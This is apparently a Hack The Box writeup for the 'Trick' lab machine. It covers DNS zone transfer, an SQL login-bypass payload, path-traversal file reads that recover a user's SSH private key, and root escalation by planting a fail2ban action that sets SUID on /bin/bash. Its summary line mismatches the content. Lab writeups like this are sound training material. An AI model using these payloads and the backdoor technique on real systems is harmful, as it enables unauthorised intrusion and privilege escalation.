---
title: "HTB Writeup: Trick [Easy]"
summary: "A medium rated box, with flask session manipulation and privilege escalation trough mysql."
tags: ["htb", "writeup", "easy"]
#externalUrl: ""
showSummary: true
date: 2023-01-19
draft: false
---


# Trick

## Reconnaissance

### Nmap
```nmap``` scans four open ports ```ssh(22)```, ```smtp(25)```, ```dns(53)``` and ```http(80)```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.38.208
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 14:19 CEST
Nmap scan report for 10.129.38.208
Host is up (0.024s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/21%OT=22%CT=1%CU=33539%PV=Y%DS=2%DC=T%G=Y%TM=62B1B85
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   24.95 ms 10.10.14.1
2   25.00 ms 10.129.38.208

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 272.42 seconds

```


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.38.208
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 14:20 CEST
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE  VERSION
53/udp   open          domain   ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
68/udp   open|filtered dhcpc
631/udp  open|filtered ipp
5353/udp open|filtered zeroconf
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1141.77 seconds
```

Since DNS Port ```53``` is open I've added the  `machinename` as usual to my `/etc/hosts` file to start off with ```DNS enumeration```.

```
┌──(kali㉿kali)-[~/htb/trick]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.38.208   trick.htb
```

### DNS Zone Transfer
https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
```
┌──(kali㉿kali)-[~]
└─$ dig axfr @10.129.38.208 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.129.38.208 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 24 msec
;; SERVER: 10.129.38.208#53(10.129.38.208) (TCP)
;; WHEN: Tue Jun 21 14:44:31 CEST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```
We succesfully transfered some DNS entries:

|Subdomain|
|---|
|preprod-payroll.trick.htb|

I've added the Subdomain to my hosts file:

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.38.208   trick.htb preprod-payroll.trick.htb 
```

### Directory Bruteforce on Subdomain

```
┌──(kali㉿kali)-[~/htb/trick]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://preprod-payroll.trick.htb/ -e -s 200 -no-status
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://preprod-payroll.trick.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/06/21 14:54:07 Starting gobuster in directory enumeration mode
===============================================================
http://preprod-payroll.trick.htb/assets               [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
http://preprod-payroll.trick.htb/database             [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
                                                                                                                  
===============================================================
2022/06/21 15:03:17 Finished
===============================================================
```
Nothing particular interesting  yet.


### SMTP User Enumeration
SMTP enum is very slow and - I decided to not bother with that stuff for now. ```MSF Auxilary modules``` verified just some standard UNIX Users.

```
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.129.38.208:25      - 10.129.38.208:25 Banner: 220 debian.localdomain ESMTP Postfix (Debian/GNU)
[+] 10.129.38.208:25      - 10.129.38.208:25 Users found: , _apt, avahi, backup, bin, colord, daemon, dnsmasq, games, geoclue, gnats, hplip, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, pulse, rtkit, saned, speech-dispatcher, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tss, usbmux, uucp, www-data                                                                                  
[*] 10.129.38.208:25      - Scanned 1 of 1 hosts (100% complete)                                                    
[*] Auxiliary module execution completed   
```

## Foothold

### Login bypass 
Eventually I found a ```SQL login bypass``` at
http://preprod-payroll.trick.htb/login.php
Just a very basic SQL Auth bypass payload: ```'or 1=1 -- —```

The panel revealed the service running is ```Recruitment Management System``` and ```searchsploit``` confirmed the Auth bypass vulnerability  and also indicated a SQLi we might can exploit:
https://www.exploit-db.com/exploits/50404

```
└─$ sqlmap -u "http://preprod-payroll.trick.htb/?page=view_vacancy&id=1"  --level=3 --risk=2 --banner --dbms=sqlite --tables   
        ___
       __H__                                                                                                        
 ___ ___[.]_____ ___ ___  {1.6.6#stable}                                                                            
|_ -| . [(]     | .'| . |                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:05:57 /2022-06-21/

```
The described SQLi did not work - so the application is probably patched to some degree.


### User Credentials

While logged in with Adminsitrator we can navigate to User>Action>Edit>Inspect Element and extract the user credentials in plain text from the page source.

| Username  |  Password |
|---|---|
| Enemigosss  | SuperGucciRainbowCake  |

Login as ```Enemigosss``` confirms the credentials validity. 

## Further Enumeration and User Access

I used ```ffuf``` for  subdomain enumeration before I found the ```preprod-payroll``` subdomain via DNS zone transfer, but it was not able to find any other subdomains.
The ```preprod-payroll``` subdomain kind of gives away that subdomains may follow a ```naming scheme``` so i've spun up ```fuff``` a second time:

```
┌──(kali㉿kali)-[~/htb/trick]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" -u http://trick.htb --fs 5480

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://trick.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 29ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1293 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

I've added ```preprod-marketing.trick.htb``` to my hosts.

|Subdomain|
|---|
|preprod-marketing.trick.htb|

```
┌──(kali㉿kali)-[~/htb/trick]
└─$ cat /etc/hosts                                                   
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.38.208   trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
```
The ```page``` URL parameter seemed very suspicous and it actually had a LFI vulnerability, which I've found after some trial and error with ```Burp```.

http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd


```
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

```/etc/passwd``` reveals a user we probably have to pivot to:
|  Username |
|---|
|  Michael |


I've checked if a ```private key``` existed in ```michaels``` ```homedir``` and grabbed ```id_rsa``` to get shell:
```
┌──(kali㉿kali)-[~/htb/trick]
└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

```
Cleaned up key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

SSH into the box:
```
┌──(kali㉿kali)-[~/htb/trick]
└─$ chmod 0400 id_rsa && ssh michael@trick.htb -i id_rsa                                                      130 ⨯
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ 
```

|  userflag |
|---|
|  REDACTED |

## Privilege Escalation

```sudo -l``` reveals that we can execute ```failtoban``` via ```sudo```, which could be the privilege escalation factor. 


```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

```
 I decided to not run ```linpeas.sh``` and investigate on ```fail2ban``` first.
 
Eventually I've found a blogpost we can try to follow along. I also could confirm that we are in the group ```security``` which has write privileges on ```/etc/fail2ban/action.d``` which is a ```requirement``` for this exploit.
https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
```
michael@trick:~$ ls -la /etc/fail2ban/
total 76
drwxr-xr-x   6 root root      4096 Jun 21 15:12 .
drwxr-xr-x 126 root root     12288 Jun 21 14:53 ..
drwxrwx---   2 root security  4096 Jun 21 15:12 action.d
-rw-r--r--   1 root root      2334 Jun 21 15:12 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jun 21 15:12 fail2ban.d
drwxr-xr-x   3 root root      4096 Jun 21 15:12 filter.d
-rw-r--r--   1 root root     22908 Jun 21 15:12 jail.conf
drwxr-xr-x   2 root root      4096 Jun 21 15:12 jail.d
-rw-r--r--   1 root root       645 Jun 21 15:12 paths-arch.conf
-rw-r--r--   1 root root      2827 Jun 21 15:12 paths-common.conf
-rw-r--r--   1 root root       573 Jun 21 15:12 paths-debian.conf
-rw-r--r--   1 root root       738 Jun 21 15:12 paths-opensuse.conf
michael@trick:~$ groups
michael security

```

From ```/etc/fail2ban/jail.conf``` I could confirm that the ```sshd``` protection will fallback to the default settings of ```fail2ban``` and trigger the ```iptables-multiport``` action.

```
# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports
```

I could not edit the existing ```iptables-mulitport.conf```, but i was able to delete it and copy a ```malicious``` config I created in ```/tmp``` into the directory. 

Note: This was a bit fiddely because some ```cronjob``` or script reset the folders contents every few minutes.


We need to add the following payload into the rule to set an SUID for ```/bin/bash``` when the ```actionban``` triggers:

```actionban = chmod 4755 /bin/bash```


```
michael@trick:/etc/fail2ban$ rm -rf /etc/fail2ban/action.d/iptables-multiport.conf 
michael@trick:/etc/fail2ban$ cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/
michael@trick:/etc/fail2ban$ cat /etc/fail2ban/action.d/iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod 4755 /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
`
```
Restarting the service with sudo, so the new config gets loaded :

```
michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

The last thing left todo is triggering the action by bruteforcing ssh.

Trigger the ```actionban``` by bruteforcing SSH:
```
┌──(kali㉿kali)-[~]
└─$ crackmapexec ssh trick.htb -u /usr/share/wordlists/rockyou.txt -p gimmeroot  
```

Check if SUID is set on ```/bin/bash```:

```
michael@trick:/etc/fail2ban$ ls -la /bin/bash
-rwsrwxr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

|  rootflag |
|---|
|  REDACTED |